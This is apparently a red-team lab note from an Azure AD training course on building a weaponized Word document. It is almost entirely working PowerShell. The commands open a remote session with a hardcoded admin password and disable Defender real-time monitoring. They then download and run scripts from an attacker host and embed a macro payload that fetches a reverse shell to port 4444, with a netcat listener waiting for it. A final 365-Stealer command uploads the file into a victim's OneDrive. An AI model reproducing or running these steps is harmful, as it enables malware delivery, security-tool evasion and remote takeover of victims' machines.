# Creating Malicious Word Files

## create weaponized doc and put this on a fileshare!

~~~ powershell
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM

# in the new powershell remoting connection
Set-MpPreference -DisableRealtimeMonitoring $true

# copy out-word.ps1 to c:\xampp\htdocs
# copy Invoke-PowerShellTcp.ps1 to c:\xampp\htdocs

iex (New-Object Net.Webclient).downloadstring("http://172.16.150.64:82/Out-Word.ps1")

Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.64:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.64 -Port 4444" -OutputFile student64.doc
exit

# copy files to local computer
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student64.doc -Destination C:\AzAD\Tools\student64.doc

# start listening shell
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444

# upload the file (through webshell)
# wait for the connect back, maybe press enter a couple of times
~~~

## upload it somewhere

use stealer or even commandline:

~~~ powershell
python 365-Stealer.py --refresh-user
MarkDWalden@defcorphq.onmicrosoft.com --upload C:\AzAD\Tools\studentX.doc
~~~